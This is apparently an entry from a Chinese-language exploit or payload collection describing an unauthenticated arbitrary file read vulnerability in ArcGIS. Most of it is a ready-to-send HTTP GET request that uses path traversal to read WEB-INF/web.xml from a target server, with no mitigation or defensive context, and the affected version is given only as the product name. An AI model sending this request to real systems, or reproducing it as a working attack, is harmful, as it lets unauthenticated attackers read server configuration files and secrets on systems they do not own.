**漏洞描述：**

ArcGIS地理信息系统 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件。

**影响版本：**

ArcGIS地理信息系统

**Payload：**

```yaml
GET /arcgis/manager/3370/js/../WEB-INF/web.xml HTTP/1.0
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

---
